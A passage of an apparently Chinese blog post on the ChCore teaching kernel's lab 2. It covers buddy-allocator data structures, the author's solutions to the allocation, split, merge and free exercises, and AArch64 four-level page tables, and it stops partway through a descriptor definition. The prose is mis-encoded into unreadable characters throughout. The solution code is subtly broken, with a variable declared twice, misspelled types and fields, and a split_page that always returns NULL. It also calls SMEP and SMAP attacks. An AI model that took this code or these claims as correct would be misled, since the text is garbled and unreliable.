<p>æ³¨ï¼šåªæœ‰å”¯ä¸€çš„ä¼™ä¼´å—å¯ä»¥åˆå¹¶</p>
<h3 id="ç»“æ„å®ç°"><a href="#ç»“æ„å®ç°" class="headerlink" title="ç»“æ„å®ç°"></a>ç»“æ„å®ç°</h3><p>åœ¨ <code>ChCore</code> ä¸­ä½¿ç”¨å”¯ä¸€ <code>struct global_mem</code> è¿›è¡Œæè¿°ç‰©ç†å†…å­˜æ•°æ®ç»“æ„ï¼Œ</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">struct phys_mem_pool &#123;</span><br><span class="line">    u64 pool_start_addr; // ç‰©ç†å†…å­˜èµ·å§‹åœ°å€</span><br><span class="line">    u64 pool_mem_size; // ç‰©ç†å†…å­˜å¤§å°</span><br><span class="line">    u64 pool_phys_page_num; // ç‰©ç†é¡µæ•°ç›®</span><br><span class="line">    struct page *page_metadata; // ç‰©ç†é¡µå…ƒæ•°æ®èµ·å§‹åœ°å€</span><br><span class="line">    struct free_list free_lists[BUDDY_MAX_ORDER]; // å†…å­˜å—ç©ºé—²é“¾è¡¨</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>ä¸ºäº†æ–¹ä¾¿è®¡æ•°ï¼Œfree_list ç»´æŠ¤äº†ç©ºé—²å—çš„ä¸ªæ•° nr_free å’Œå…¶ç®¡ç†çš„ free_list</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">struct free_list &#123;</span><br><span class="line">	struct list_head free_list; // ç©ºé—²é“¾è¡¨</span><br><span class="line">	u64 nr_free;    // ç©ºé—²å—æ•°ç›®</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct list_head &#123;</span><br><span class="line">	struct list_head *prev;</span><br><span class="line">	struct list_head *next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>å¦‚ä½•é€šè¿‡ <code>list_head</code> å¯¹é¡µè¿›è¡Œç®¡ç†å‘¢ï¼Œå…¶å®å¹¶éç›´æ¥å°† page è¿›è¡Œé“¾æ¥ï¼Œè€Œæ˜¯é€šè¿‡ page ç»“æ„ä½“å†…éƒ¨çš„æˆå‘˜ node è¿›è¡Œé“¾æ¥</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">struct page &#123;</span><br><span class="line">	struct list_head node; // ç©ºé—²é“¾è¡¨</span><br><span class="line">	int allocated; // æ˜¯å¦å·²åˆ†é…</span><br><span class="line">	int order; // å½“å‰é¡µå±äºå‡ é˜¶å†…å­˜å—</span><br><span class="line">	void *slab; // è¢« slab åˆ†é…å™¨ä½¿ç”¨</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">                  page    page    page</span><br><span class="line"> free_list       â”Œâ”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”</span><br><span class="line">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚    â”‚  â”‚    â”‚  â”‚    â”‚</span><br><span class="line">â”‚nr_free  â”‚      â”‚    â”‚  â”‚    â”‚  â”‚    â”‚</span><br><span class="line">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤    â”€â–ºâ”œâ”€â”€â”€â”€â”¼â”€â–ºâ”œâ”€â”€â”€â”€â”¼â”€â–ºâ”œâ”€â”€â”€â”€â”¼â”€â–º</span><br><span class="line">â”‚free_listâ”œâ”€â”€â”€â–º  â”‚nodeâ”‚  â”‚nodeâ”‚  â”‚nodeâ”‚</span><br><span class="line">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â—„â”€â”´â”€â”€â”€â”€â”˜â—„â”€â”´â”€â”€â”€â”€â”˜â—„â”€â”´â”€â”€â”€â”€â”˜â—„â”€</span><br></pre></td></tr></table></figure>
<p>å¦‚ä½•æ ¹æ® <code>node</code> è·å– <code>page</code> çš„åœ°å€å‘¢ï¼Œæœ€ç®€å•çš„æƒ³æ³•å°±æ˜¯æ ¹æ®åç§»å€¼</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define list_entry(ptr, <span class="built_in">type</span>, field) \</span></span><br><span class="line"><span class="language-bash">	container_of(ptr, <span class="built_in">type</span>, field)</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define container_of(ptr, <span class="built_in">type</span>, field) \</span></span><br><span class="line"><span class="language-bash">	((<span class="built_in">type</span> *)((void *)(ptr) - (u64)(&amp;(((<span class="built_in">type</span> *)(0))-&gt;field))))</span></span><br><span class="line"></span><br><span class="line">ç®€åŒ–ä¸€ä¸‹</span><br><span class="line">ptrï¼šæŒ‡å‘åœ°å€</span><br><span class="line">typeï¼šæ‰€å±ç»“æ„ä½“ç±»å‹</span><br><span class="line">fieldï¼šç»“æ„ä½“ä¸­æ‰€å±å­—æ®µ</span><br><span class="line"></span><br><span class="line">ğŸŒ° struct page *page = list_entry((struct list_head *) ptr, (strcut page) page, ((struct page) page-&gt;(struct list_head)) node)</span><br></pre></td></tr></table></figure>

<h3 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">init_buddy</span><span class="params">(<span class="keyword">struct</span> phys_mem_pool *pool, <span class="keyword">struct</span> page *start_page,</span></span><br><span class="line"><span class="params">		<span class="type">vaddr_t</span> start_addr, u64 page_num)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> order;</span><br><span class="line">    <span class="type">int</span> page_idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–å†…å­˜æ± </span></span><br><span class="line">    pool-&gt;pool_start_addr = start_addr;</span><br><span class="line">    pool-&gt;page_metadata = start_page;</span><br><span class="line">    pool-&gt;pool_mem_size = page_num * BUDDY_PAGE_SIZE;</span><br><span class="line">    <span class="comment">/* This field is for unit test only. */</span></span><br><span class="line">    pool-&gt;pool_phys_page_num = page_num;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–å„é˜¶ free_list</span></span><br><span class="line">    <span class="keyword">for</span> (order = <span class="number">0</span>; order &lt; BUDDY_MAX_ORDER; ++order) &#123;</span><br><span class="line">        pool-&gt;free_lists[order].nr_free = <span class="number">0</span>;</span><br><span class="line">        init_list_head(&amp;(pool-&gt;free_lists[order].free_list));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¸…ç©ºå…ƒæ•°æ®åŒº</span></span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">char</span> *)start_page, <span class="number">0</span>, page_num * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> page));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–å…ƒæ•°æ®åŒºï¼Œå°†æ¯ä¸ªé¡µå‡æ ‡è®°ä¸ºå·²åˆ†é…ï¼Œé˜¶æ•°ä¸º 0</span></span><br><span class="line">    <span class="keyword">for</span> (page_idx = <span class="number">0</span>; page_idx &lt; page_num; ++page_idx) &#123;</span><br><span class="line">        page = start_page + page_idx;</span><br><span class="line">        page-&gt;allocated = <span class="number">1</span>;</span><br><span class="line">        page-&gt;order = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å¯¹æ¯ä¸ª page è¿›è¡Œå›æ”¶ï¼Œé€šè¿‡ buddy_free_pages æ”¶åˆ°å¯¹åº”çš„ free_list ä¸­</span></span><br><span class="line">    <span class="keyword">for</span> (page_idx = <span class="number">0</span>; page_idx &lt; page_num; ++page_idx) &#123;</span><br><span class="line">        page = start_page + page_idx;</span><br><span class="line">        buddy_free_pages(pool, page);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–ä¼™ä¼´å—</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> page *<span class="title function_">get_buddy_chunk</span><span class="params">(<span class="keyword">struct</span> phys_mem_pool *pool,</span></span><br><span class="line"><span class="params">				    <span class="keyword">struct</span> page *chunk)</span></span><br><span class="line">&#123;</span><br><span class="line">    u64 chunk_addr;</span><br><span class="line">    u64 buddy_chunk_addr;</span><br><span class="line">    <span class="type">int</span> order;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–å½“å‰å—çš„åœ°å€</span></span><br><span class="line">    chunk_addr = (u64) page_to_virt(pool, chunk);</span><br><span class="line">    order = chunk-&gt;order;</span><br><span class="line">    <span class="comment">/* é€šè¿‡ä¼™ä¼´å—çš„åœ°å€å…³ç³»è®¡ç®—å¾—åˆ°ä¼™ä¼´å—çš„åœ°å€</span></span><br><span class="line"><span class="comment">     * ç”±äºä¼™ä¼´å—çš„é˜¶æ•°ç›¸åŒï¼Œæ‰€ä»¥ä¼™ä¼´å—åœ°å€ä¹‹é—´ä»…æœ‰ä¸€ä½å·®åˆ«ï¼Œä»…éœ€åšä¸€æ¬¡å¼‚æˆ–æ“ä½œ</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> BUDDY_PAGE_SIZE_ORDER (12)</span></span><br><span class="line">    buddy_chunk_addr = chunk_addr ^</span><br><span class="line">        (<span class="number">1UL</span> &lt;&lt; (order + BUDDY_PAGE_SIZE_ORDER));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æŸ¥ä¼™ä¼´å—çš„åœ°å€æ˜¯å¦å±äºè¯¥å†…å­˜æ± </span></span><br><span class="line">    <span class="keyword">if</span> ((buddy_chunk_addr &lt; pool-&gt;pool_start_addr) ||</span><br><span class="line">        (buddy_chunk_addr &gt;= (pool-&gt;pool_start_addr +</span><br><span class="line">                    pool-&gt;pool_mem_size))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> virt_to_page(pool, (<span class="type">void</span> *)buddy_chunk_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ç»ƒä¹ -1"><a href="#ç»ƒä¹ -1" class="headerlink" title="ç»ƒä¹  1"></a>ç»ƒä¹  1</h3><p><strong>å® ç°kernel&#x2F;mm&#x2F;buddy.cä¸­ çš„ å›› ä¸ª å‡½ æ•°ï¼šbuddy_get_pages()ï¼Œsplit_page()ï¼Œbuddy_free_pages()ï¼Œmerge_page()ã€‚è¯·å‚è€ƒä¼™ä¼´å—ç´¢å¼•ç­‰åŠŸèƒ½çš„è¾…åŠ©å‡½æ•°:get_buddy_chunk()ã€‚</strong><br>ä»ä¼™ä¼´ç³»ç»Ÿè·å–å—çš„å¤§è‡´æµç¨‹ï¼š</p>
<ul>
<li>æ‰¾åˆ°èƒ½å¤Ÿæ»¡è¶³è¿ç»­åˆ†é… order çš„è¿ç»­é¡µå—</li>
<li>è¿›è¡Œåˆ†é…</li>
<li>åˆ†å‰² list node<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * buddy_get_pages: get free page from buddy system.</span></span><br><span class="line"><span class="comment"> * pool @ physical memory structure reserved in the kernel</span></span><br><span class="line"><span class="comment"> * order @ get the (1&lt;&lt;order) continous pages from the buddy system </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> page *<span class="title function_">buddy_get_pages</span><span class="params">(<span class="keyword">struct</span> phys_mem_pool *pool, u64 order)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// &lt;lab2&gt;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> current_order = order;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (current_order &lt; BUDDY_MAX_ORDER &amp;&amp; pool-&gt;freelists[current_order].nr_free &lt;= <span class="number">0</span>)</span><br><span class="line">        current_order++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (current_order &gt;= BUDDY_MAX_ORDER)&#123;</span><br><span class="line">        kwarn(<span class="string">&quot;Try to allocate a buddy chunk greater than BUDDY_MAX_ORDER\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> list_entry(pool-&gt;freelists[current_order].free_list.next, <span class="keyword">struct</span> page, node);</span><br><span class="line">    <span class="keyword">if</span> (page == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        kdebug(<span class="string">&quot;buddy get a NULL page\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    split_page(pool, order, page);</span><br><span class="line">    page-&gt;allocated = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page;</span><br><span class="line">    <span class="comment">// &lt;/lab2&gt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
ä»ä¼™ä¼´ç³»ç»Ÿåˆ†å‰² list node çš„å¤§è‡´æµç¨‹</li>
<li>æå–è¦åˆ‡å‰²çš„é¡µ</li>
<li>é€’å½’åˆ†å‰²ï¼Œç›´åˆ°æ»¡è¶³å¤§å°</li>
<li>ç›¸å…³ free_list çš„æ•°ç›®è¦å‰Šå‡<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">page_append</span><span class="params">(<span class="keyword">struct</span> phys_mem_pool *pool, strcut page *page)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">free_list</span> *<span class="title">free_list</span> =</span> &amp;pool-&gt;free_lists[page-&gt;order];</span><br><span class="line">    list_add(&amp;page-&gt;node, &amp;free_list-&gt;free_list);</span><br><span class="line">    free_list-&gt;nr_free++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">page_del</span><span class="params">(<span class="keyword">struct</span> phys_mem_pool *pool, strcut page *page)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">free_list</span> *<span class="title">free_list</span> =</span> &amp;pool-&gt;free_lists[page-&gt;order];</span><br><span class="line">    list_del(&amp;page-&gt;node);</span><br><span class="line">    free_list-&gt;nr_free--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * split_page: split the memory block into two smaller sub-block, whose order</span></span><br><span class="line"><span class="comment"> * is half of the origin page.</span></span><br><span class="line"><span class="comment"> * pool @ physical memory structure reserved in the kernel</span></span><br><span class="line"><span class="comment"> * order @ order for origin page block</span></span><br><span class="line"><span class="comment"> * page @ splitted page</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> page *<span class="title function_">split_page</span><span class="params">(<span class="keyword">struct</span> phys_mem_pool *pool, u64 order,</span></span><br><span class="line"><span class="params">			       <span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// &lt;lab2&gt;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">split_page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (page-&gt;allocated == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        kwarn(<span class="string">&quot;Try to split an allocated page\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    page-&gt;allocated = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    page_del(pool, page);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (page-&gt;order &gt; order)</span><br><span class="line">    &#123;</span><br><span class="line">        page-&gt;order--;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span>* <span class="title">buddy_page</span> =</span> get_buddy_chunk(pool, page);</span><br><span class="line">        <span class="keyword">if</span> (buddy_page != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            buddy_page-&gt;allocated = <span class="number">0</span>;</span><br><span class="line">            buddy_page-&gt;order = page-&gt;order;</span><br><span class="line">            page_append(pool, buddy_page);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> split_page;</span><br><span class="line">    <span class="comment">// &lt;/lab2&gt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
ä»ä¼™ä¼´ç³»ç»Ÿåˆå¹¶ list node çš„å¤§æ¦‚æµç¨‹</li>
<li>æå–è¦åˆå¹¶çš„å—</li>
<li>æŸ¥æ‰¾ä¼™ä¼´å—</li>
<li>é€’å½’åˆå¹¶</li>
<li>ä¿®æ”¹ nr_free<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * merge_page: merge the given page with the buddy page</span></span><br><span class="line"><span class="comment"> * pool @ physical memory structure reserved in the kernel</span></span><br><span class="line"><span class="comment"> * page @ merged page (attempted)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> page *<span class="title function_">merge_page</span><span class="params">(<span class="keyword">struct</span> phys_mem_pool *pool, <span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// &lt;lab2&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">merge_page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (page-&gt;allocated == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        kwarn(<span class="string">&quot;Try to merge an allocated page\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    page_del(pool, page);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (page-&gt;order &lt; BUDDY_MAX_ORDER)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span>* <span class="title">buddy_page</span> =</span> get_buddy_chunk(pool, page);</span><br><span class="line">        <span class="keyword">if</span> (buddy_page == <span class="literal">NULL</span> || buddy_page-&gt;allocated || buddy_page-&gt;order != page-&gt;order)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (page &gt; buddy_page)&#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">page</span>* <span class="title">tmp</span> =</span> buddy_page;</span><br><span class="line">            buddy_page = page;</span><br><span class="line">            page = tmp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        buddy_page-&gt;allocated = <span class="number">1</span>;</span><br><span class="line">        page_del(pool, page);</span><br><span class="line">        page-&gt;order++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    page_append(pool, page);</span><br><span class="line">    merge_page = page;</span><br><span class="line">	<span class="keyword">return</span> merge_page;</span><br><span class="line">	<span class="comment">// &lt;/lab2&gt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
ä»é‡Šæ”¾å—åˆ°ä¼™ä¼´ç³»ç»Ÿçš„å¤§è‡´æµç¨‹ï¼š</li>
<li>åˆ¤æ–­æ˜¯å¦åœ¨ä½¿ç”¨</li>
<li>é‡Šæ”¾å¹¶åˆå¹¶<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * buddy_free_pages: give back the pages to buddy system</span></span><br><span class="line"><span class="comment"> * pool @ physical memory structure reserved in the kernel</span></span><br><span class="line"><span class="comment"> * page @ free page structure</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">buddy_free_pages</span><span class="params">(<span class="keyword">struct</span> phys_mem_pool *pool, <span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// &lt;lab2&gt;</span></span><br><span class="line">    <span class="keyword">if</span> (!page-&gt;allocated)&#123;</span><br><span class="line">        kwarn(<span class="string">&quot;Try to free a free page\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    page-&gt;allocated = <span class="number">0</span>;</span><br><span class="line">    page_append(pool, page);</span><br><span class="line"></span><br><span class="line">    merge_page(pool, page);</span><br><span class="line">	<span class="comment">// &lt;/lab2&gt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="è™šæ‹Ÿå†…å­˜æ˜ å°„"><a href="#è™šæ‹Ÿå†…å­˜æ˜ å°„" class="headerlink" title="è™šæ‹Ÿå†…å­˜æ˜ å°„"></a>è™šæ‹Ÿå†…å­˜æ˜ å°„</h1><h2 id="AArch64-åœ°å€ç¿»è¯‘ä¸åœ°å€ç©ºé—´åˆ†ç¦»"><a href="#AArch64-åœ°å€ç¿»è¯‘ä¸åœ°å€ç©ºé—´åˆ†ç¦»" class="headerlink" title="AArch64 åœ°å€ç¿»è¯‘ä¸åœ°å€ç©ºé—´åˆ†ç¦»"></a>AArch64 åœ°å€ç¿»è¯‘ä¸åœ°å€ç©ºé—´åˆ†ç¦»</h2><p>ç¨‹åºä¸­çš„æ•°æ®æˆ–æŒ‡ä»¤çš„è™šæ‹Ÿåœ°å€ï¼Œæ— æ³•ç›´æ¥è¢«å¤„ç†å™¨ä½¿ç”¨ï¼Œé€šè¿‡ MMU å†…å­˜ç®¡ç†å•å…ƒè¿›è¡Œç¿»è¯‘ï¼ŒMMU ä¸€èˆ¬é€šè¿‡éå†å†…å­˜ä¸­çš„é¡µè¡¨ï¼Œå°†ç¨‹åºä¸­çš„è™šæ‹Ÿåœ°å€ç¿»è¯‘ä¸ºç‰©ç†åœ°å€</p>
<p>ä¸åŒè¿›ç¨‹é—´ï¼Œä»¥åŠè¿›ç¨‹æ€å’Œç”¨æˆ·æ€ä¹‹é—´æ‹¥æœ‰ä¸åŒçš„é¡µè¡¨ï¼Œæ“ä½œç³»ç»Ÿåœ¨è¿›è¡Œä¸Šä¸‹æ–‡åˆ‡æ¢æ—¶ä¹Ÿä¼šåˆ‡æ¢å¯¹åº”çš„é¡µè¡¨é¡¹</p>
<p>AArch64 ä½¿ç”¨ä¸¤ä¸ªé¡µè¡¨åŸºåœ°å€å¯„å­˜å™¨ï¼Œç”¨æ¥åˆ†ç¦»è¿›ç¨‹æ€å’Œå†…æ ¸æ€çš„é¡µè¡¨ï¼Œå…¶ç¿»è¯‘èŒƒå›´ç”± TCR_ELx é…ç½®ï¼Œä¸€èˆ¬è€Œè¨€ï¼ˆä»¥ 48 ä½ä¸ºä¾‹ï¼‰</p>
<ul>
<li>TTBR0_ELx å­˜å‚¨ç”¨æˆ·æ€é¡µè¡¨åŸºå€ è½¬æ¢èŒƒå›´ 0x0000000000000000 ~ 0x0000FFFFFFFFFFFF</li>
<li>TTBR1_ELx å­˜å‚¨å†…æ ¸æ€é¡µè¡¨åŸºå€ è½¬æ¢èŒƒå›´ 0xFFFF000000000000 ~ 0xFFFFFFFFFFFFFFFF</li>
</ul>
<p><strong>é—®é¢˜ 2</strong></p>
<blockquote>
<p>AArch64 é‡‡ç”¨äº†ä¸¤ä¸ªé¡µè¡¨åŸºåœ°å€å¯„å­˜å™¨ï¼Œç›¸è¾ƒäº x86-64 æ¶æ„ä¸­åªæœ‰ä¸€ä¸ªé¡µè¡¨åŸºåœ°å€å¯„å­˜å™¨ï¼Œè¿™æ ·çš„å¥½å¤„æ˜¯ä»€ä¹ˆï¼Ÿè¯·ä»æ€§èƒ½ä¸å®‰å…¨ä¸¤ä¸ªè§’åº¦åšç®€è¦çš„å›ç­”ã€‚</p>
</blockquote>
<p>ä»æ€§èƒ½æ¥çœ‹ï¼Œå¯¹è¿›ç¨‹æ€å’Œå†…æ ¸æ€è®¾ç½®ä¸åŒçš„é¡µè¡¨ï¼Œä¸€æ–¹é¢åœ¨è¿›è¡Œç³»ç»Ÿè°ƒç”¨æ—¶æ— éœ€è¿›è¡Œé¡µè¡¨çš„åˆ‡æ¢ï¼Œä¹Ÿé¿å… TLB åˆ·æ–°çš„å¼€é”€</p>
<p>x86_64 ä»…æä¾›ä¸€ä¸ªé¡µè¡¨åŸºå€å¯„å­˜å™¨ CR3 å†…æ ¸ä¸ä½¿ç”¨å•ç‹¬é¡µè¡¨ï¼Œå› æ­¤é€‰æ‹©ç›´æ¥æ˜ å°„åˆ°åº”ç”¨ç¨‹åºçš„é«˜åœ°å€éƒ¨åˆ†ï¼Œä¹Ÿé¿å…äº†ç³»ç»Ÿè°ƒç”¨ä¸­é€ æˆçš„é¡µè¡¨åˆ‡æ¢</p>
<p>ä»å®‰å…¨æ€§æ¥çœ‹ï¼ŒåŒé¡µè¡¨èƒ½å¤Ÿä½¿å†…æ ¸æ€ä¸è¿›ç¨‹æ€ä¹‹é—´çš„æ•°æ®æŒ‡ä»¤æ— æ³•è¿›è¡Œäº¤äº’ï¼Œèƒ½å¤Ÿé˜²æ­¢ SMEP SMAP ç­‰æ”»å‡»</p>
<h2 id="è™šæ‹Ÿåœ°å€ç¿»è¯‘ä¸ç»„æˆ"><a href="#è™šæ‹Ÿåœ°å€ç¿»è¯‘ä¸ç»„æˆ" class="headerlink" title="è™šæ‹Ÿåœ°å€ç¿»è¯‘ä¸ç»„æˆ"></a>è™šæ‹Ÿåœ°å€ç¿»è¯‘ä¸ç»„æˆ</h2><p>ChCore é‡‡ç”¨å››çº§é¡µè¡¨ç»“æ„<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205311559912.png"></p>
<p>MMU ä½¿ç”¨ 48 ä½è¿›è¡Œé¡µè¡¨çš„éå†</p>
<ul>
<li>[47:39] 0çº§é¡µè¡¨ç´¢å¼•å·ï¼Œ1ä¸ª0çº§é¡µè¡¨é¡¹å¯¹åº” 512 Gï¼Œå…¶å†…å®¹æŒ‡å‘1çº§é¡µè¡¨</li>
<li>[38:30] 1çº§é¡µè¡¨ç´¢å¼•å·ï¼Œæ¯ä¸ª1çº§é¡µè¡¨é¡¹å¯¹åº” 1 GèŒƒå›´ï¼Œå…¶å†…å®¹æŒ‡å‘2çº§é¡µè¡¨</li>
<li>[29:21] 2çº§é¡µè¡¨ç´¢å¼•å·ï¼Œæ¯ä¸ª2çº§é¡µè¡¨é¡¹å¯¹åº” 2 MèŒƒå›´ï¼Œå…¶å†…å®¹æŒ‡å‘3çº§é¡µè¡¨</li>
<li>[20:12] 3çº§é¡µè¡¨ç´¢å¼•å·ï¼Œæ¯ä¸ª3çº§é¡µè¡¨é¡¹å¯¹åº” 4k èŒƒå›´ï¼Œå³ä¸€é¡µï¼Œå…¶å†…å®¹ä¸ºé¡µå¸§å·</li>
<li>[11:0]  é¡µåç§»ï¼Œä¸é¡µå¸§å·ç»“åˆèƒ½å¾—åˆ°çœŸå®ç‰©ç†åœ°å€</li>
</ul>
<p>é¡µè¡¨é¡¹ä½¿ç”¨æè¿°ç¬¦è¿›è¡Œè¡¨ç¤ºï¼Œåˆ†ä¸ºä¸‰ç§ï¼š</p>
<ul>
<li>è¡¨æè¿°ç¬¦ï¼šæ„å‘³ç€ä¸‹ä¸€çº§ä¸ºé¡µè¡¨ï¼ŒåŒ…å«é¡µè¡¨åœ°å€åŠå±æ€§</li>
<li>å—æè¿°ç¬¦ï¼šåŒ…å«ä¸‹ä¸€é¡¹é¡µè¡¨åœ°å€æˆ–è€…é¡µå¸§å·åŠç›¸åº”çš„å±æ€§</li>
<li>é¡µæè¿°ç¬¦ï¼šè¡¨ç¤ºä¸‹ä¸€çº§ä¸ºé¡µï¼ŒåŒ…å«é¡µå¸§å·åŠå±æ€§</li>
</ul>
<p>å…¶æ¡ç›®ç»“æ„å¦‚ä¸‹ï¼š<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205311616954.png"><br>å¯¹åº”æºç è¿›è¡Œç†è§£</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        u64 is_valid:<span class="number">1</span>, is_table:<span class="number">1</span>, ignored1:<span class="number">10</span>, next_table_addr:<span class="number">36</span>, reserved:<span class="number">4</span>, ignored2:<span class="number">7</span>, PXNTable:<span class="number">1</span>,	<span class="comment">// Privileged Execute-never for next level</span></span><br><span class="line">            XNTable:<span class="number">1</span>,	<span class="comment">// Execute-never for next level</span></span><br><span class="line">            APTable:<span class="number">2</span>,	<span class="comment">// Access permissions for next level</span></span><br><span class="line">            NSTable:<span class="number">1</span>;</span><br><span class="line">    &#125; table;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        u64 is_valid:<span class="number">1</span>, is_table:<span class="number">1</span>, 